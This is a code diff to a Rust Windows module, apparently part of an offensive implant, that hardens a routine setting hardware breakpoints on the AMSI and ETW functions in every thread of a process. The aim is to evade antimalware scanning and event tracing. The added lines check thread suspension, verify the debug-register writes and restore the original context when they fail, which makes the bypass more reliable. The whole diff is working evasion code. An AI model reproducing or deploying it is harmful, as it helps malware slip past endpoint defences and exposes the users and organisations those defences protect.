@@ -253,8 +253,37 @@ pub unsafe fn setup_hardware_breakpoints() {
                 if te32.th32OwnerProcessID == pid {
                     let h_thread = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);
                     if !h_thread.is_null() {
-                        SuspendThread(h_thread);
+                        // (1) SuspendThread: returns -1 (0xFFFFFFFF) on failure.
+                        let suspend_count = SuspendThread(h_thread);
+                        if suspend_count == u32::MAX {
+                            log::warn!(
+                                "evasion: SuspendThread failed for tid {} — skipping context modification",
+                                te32.th32ThreadID
+                            );
+                            CloseHandle(h_thread);
+                            // Continue to next thread; don't attempt context changes
+                            // on a thread we couldn't suspend.
+                            if Thread32Next(snapshot, &mut te32) == 0 {
+                                break;
+                            }
+                            continue;
+                        }
 
+                        // (5) Save original context for restoration on error.
+                        let mut orig_ctx: CONTEXT = std::mem::zeroed();
+                        orig_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+                        let _orig_saved = if let Some(nt_get_ctx) = nt_get_context_thread {
+                            let status = nt_get_ctx(h_thread, &mut orig_ctx);
+                            if status >= 0 {
+                                true
+                            } else {
+                                GetThreadContext(h_thread, &mut orig_ctx) != 0
+                            }
+                        } else {
+                            GetThreadContext(h_thread, &mut orig_ctx) != 0
+                        };
+
+                        // (2) GetThreadContext: returns 0 on failure.
                         let mut ctx: CONTEXT = std::mem::zeroed();
                         ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                         let got_context = if let Some(nt_get_ctx) = nt_get_context_thread {
@@ -273,28 +302,95 @@ pub unsafe fn setup_hardware_breakpoints() {
                             GetThreadContext(h_thread, &mut ctx) != 0
                         };
 
-                        if got_context {
-                            ctx.Dr0 = AMSI_ADDR.load(Ordering::Relaxed) as u64;
-                            ctx.Dr1 = ETW_ADDR.load(Ordering::Relaxed) as u64;
-                            // Enable local breakpoints for Dr0 (bit 0) and Dr1 (bit 2)
-                            ctx.Dr7 |= (1 << 0) | (1 << 2);
-
-                            if let Some(nt_set_ctx) = nt_set_context_thread {
-                                let status = nt_set_ctx(h_thread, &mut ctx);
-                                if status < 0 {
-                                    log::warn!(
-                                        "evasion: NtSetContextThread failed for tid {} (status=0x{:08x}), falling back to SetThreadContext",
-                                        te32.th32ThreadID,
-                                        status as u32
-                                    );
-                                    SetThreadContext(h_thread, &ctx);
-                                }
-                            } else {
-                                SetThreadContext(h_thread, &ctx);
+                        if !got_context {
+                            log::warn!(
+                                "evasion: GetThreadContext failed for tid {} — restoring suspension and skipping",
+                                te32.th32ThreadID
+                            );
+                            ResumeThread(h_thread);
+                            CloseHandle(h_thread);
+                            if Thread32Next(snapshot, &mut te32) == 0 {
+                                break;
                             }
+                            continue;
                         }
 
-                        ResumeThread(h_thread);
+                        // Modify debug registers.
+                        ctx.Dr0 = AMSI_ADDR.load(Ordering::Relaxed) as u64;
+                        ctx.Dr1 = ETW_ADDR.load(Ordering::Relaxed) as u64;
+                        // Enable local breakpoints for Dr0 (bit 0) and Dr1 (bit 2)
+                        ctx.Dr7 |= (1 << 0) | (1 << 2);
+
+                        let set_ok = if let Some(nt_set_ctx) = nt_set_context_thread {
+                            let status = nt_set_ctx(h_thread, &mut ctx);
+                            if status < 0 {
+                                log::warn!(
+                                    "evasion: NtSetContextThread failed for tid {} (status=0x{:08x}), falling back to SetThreadContext",
+                                    te32.th32ThreadID,
+                                    status as u32
+                                );
+                                SetThreadContext(h_thread, &ctx) != 0
+                            } else {
+                                true
+                            }
+                        } else {
+                            SetThreadContext(h_thread, &ctx) != 0
+                        };
+
+                        // (3) Verify SetThreadContext by re-reading and comparing Dr0/Dr1/Dr7.
+                        if set_ok {
+                            let mut verify_ctx: CONTEXT = std::mem::zeroed();
+                            verify_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+                            let verify_ok = if let Some(nt_get_ctx) = nt_get_context_thread {
+                                let status = nt_get_ctx(h_thread, &mut verify_ctx);
+                                if status >= 0 { true } else {
+                                    GetThreadContext(h_thread, &mut verify_ctx) != 0
+                                }
+                            } else {
+                                GetThreadContext(h_thread, &mut verify_ctx) != 0
+                            };
+
+                            if !verify_ok
+                                || verify_ctx.Dr0 != ctx.Dr0
+                                || verify_ctx.Dr1 != ctx.Dr1
+                                || (verify_ctx.Dr7 & ((1 << 0) | (1 << 2))) != (ctx.Dr7 & ((1 << 0) | (1 << 2)))
+                            {
+                                log::warn!(
+                                    "evasion: SetThreadContext verification failed for tid {} — Dr0={:#x} (expected {:#x}), Dr1={:#x} (expected {:#x}), restoring original context",
+                                    te32.th32ThreadID,
+                                    verify_ctx.Dr0, ctx.Dr0,
+                                    verify_ctx.Dr1, ctx.Dr1,
+                                );
+                                // Restore original debug registers.
+                                if _orig_saved {
+                                    let _ = if let Some(nt_set_ctx) = nt_set_context_thread {
+                                        nt_set_ctx(h_thread, &mut orig_ctx)
+                                    } else {
+                                        if SetThreadContext(h_thread, &orig_ctx) != 0 { 0 } else { -1 }
+                                    };
+                                }
+                            }
+                        } else {
+                            log::warn!(
+                                "evasion: SetThreadContext failed for tid {} — debug registers not modified",
+                                te32.th32ThreadID
+                            );
+                        }
+
+                        // (4) ResumeThread: returns 0 if the thread was not previously
+                        // suspended, or -1 (0xFFFFFFFF) on error.
+                        let resume_result = ResumeThread(h_thread);
+                        if resume_result == u32::MAX {
+                            log::error!(
+                                "evasion: ResumeThread failed for tid {} — thread may be left in suspended state!",
+                                te32.th32ThreadID
+                            );
+                        } else if resume_result == 0 {
+                            log::warn!(
+                                "evasion: ResumeThread returned 0 for tid {} — thread was not in suspended state",
+                                te32.th32ThreadID
+                            );
+                        }
                         CloseHandle(h_thread);
                     }
                 }
@@ -433,6 +529,21 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     let h = GetCurrentThread();
 
+    // Save original context for restoration on verification failure.
+    let mut orig_ctx: CONTEXT = std::mem::zeroed();
+    orig_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    let orig_saved = if let Some(nt_get) = nt_get_ctx {
+        let status = nt_get(h, &mut orig_ctx);
+        if status >= 0 { true } else {
+            GetThreadContext(h, &mut orig_ctx) != 0
+        }
+    } else {
+        GetThreadContext(h, &mut orig_ctx) != 0
+    };
+
+    let mut ctx: CONTEXT = std::mem::zeroed();
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
     let got_ctx = if let Some(nt_get) = nt_get_ctx {
         let status = nt_get(h, &mut ctx);
         if status < 0 {
@@ -448,22 +559,68 @@ pub unsafe fn apply_hwbp_to_current_thread() {
         GetThreadContext(h, &mut ctx) != 0
     };
 
-    if got_ctx {
-        ctx.Dr0 = amsi as u64;
-        ctx.Dr1 = etw as u64;
-        ctx.Dr7 |= (1 << 0) | (1 << 2); // enable local breakpoints for Dr0 and Dr1
+    if !got_ctx {
+        log::warn!(
+            "evasion: apply_hwbp_to_current_thread: GetThreadContext failed — skipping HWBP setup"
+        );
+        return;
+    }
 
-        if let Some(nt_set) = nt_set_ctx {
-            let status = nt_set(h, &mut ctx);
-            if status < 0 {
-                log::warn!(
-                    "evasion: apply_hwbp_to_current_thread: NtSetContextThread failed (status=0x{:08x}), falling back to SetThreadContext",
-                    status as u32
-                );
-                SetThreadContext(h, &ctx);
-            }
+    ctx.Dr0 = amsi as u64;
+    ctx.Dr1 = etw as u64;
+    ctx.Dr7 |= (1 << 0) | (1 << 2); // enable local breakpoints for Dr0 and Dr1
+
+    let set_ok = if let Some(nt_set) = nt_set_ctx {
+        let status = nt_set(h, &mut ctx);
+        if status < 0 {
+            log::warn!(
+                "evasion: apply_hwbp_to_current_thread: NtSetContextThread failed (status=0x{:08x}), falling back to SetThreadContext",
+                status as u32
+            );
+            SetThreadContext(h, &ctx) != 0
         } else {
-            SetThreadContext(h, &ctx);
+            true
+        }
+    } else {
+        SetThreadContext(h, &ctx) != 0
+    };
+
+    if !set_ok {
+        log::warn!(
+            "evasion: apply_hwbp_to_current_thread: SetThreadContext failed — debug registers not modified"
+        );
+        return;
+    }
+
+    // Verify SetThreadContext by re-reading and comparing Dr0/Dr1/Dr7.
+    let mut verify_ctx: CONTEXT = std::mem::zeroed();
+    verify_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    let verify_ok = if let Some(nt_get) = nt_get_ctx {
+        let status = nt_get(h, &mut verify_ctx);
+        if status >= 0 { true } else {
+            GetThreadContext(h, &mut verify_ctx) != 0
+        }
+    } else {
+        GetThreadContext(h, &mut verify_ctx) != 0
+    };
+
+    if !verify_ok
+        || verify_ctx.Dr0 != ctx.Dr0
+        || verify_ctx.Dr1 != ctx.Dr1
+        || (verify_ctx.Dr7 & ((1 << 0) | (1 << 2))) != (ctx.Dr7 & ((1 << 0) | (1 << 2)))
+    {
+        log::warn!(
+            "evasion: apply_hwbp_to_current_thread: SetThreadContext verification failed — Dr0={:#x} (expected {:#x}), Dr1={:#x} (expected {:#x}), restoring original context",
+            verify_ctx.Dr0, ctx.Dr0,
+            verify_ctx.Dr1, ctx.Dr1,
+        );
+        // Restore original debug registers.
+        if orig_saved {
+            let _ = if let Some(nt_set) = nt_set_ctx {
+                nt_set(h, &mut orig_ctx)
+            } else {
+                if SetThreadContext(h, &orig_ctx) != 0 { 0i32 } else { -1i32 }
+            };
         }
     }
 }
